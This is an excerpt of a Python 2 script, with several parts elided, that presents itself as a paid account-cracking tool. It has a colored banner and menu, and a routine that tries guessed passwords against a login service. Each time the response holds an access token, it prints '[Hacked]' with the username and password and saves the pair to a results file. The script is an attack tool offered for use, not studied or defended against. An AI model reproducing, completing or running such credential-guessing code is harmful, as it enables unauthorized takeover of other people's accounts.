...
\033[1;91m`--''       ;   |/   \  ' | 
\033[1;91m            `---'     `--`  
\033[1;93m This Tool Create bY aro
\033[1;93m The Fastet Toll For CRacked
\033[1;93m Id Active 10$
"""
back = 0
successful = []
cpb = []
...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m Cracked'
    print '\x1b[1;95m[2]\x1b[1;92m Contact As Aro'
    print '\x1b[1;96m[0]\x1b[1;92m Log out'
    print 42 * '\x1b[1;91m='
    action()
...
def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mDanyak Halbzhera):  \x1b[1;93m>>>\x1b[1;95m  ')
    if bch == '':
        ...
        os.system('clear') 
        print logo
        print '\x1b[1;92m770, 750, 773, 751'
        try:
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91m[Hacked]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91m[Hacked]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
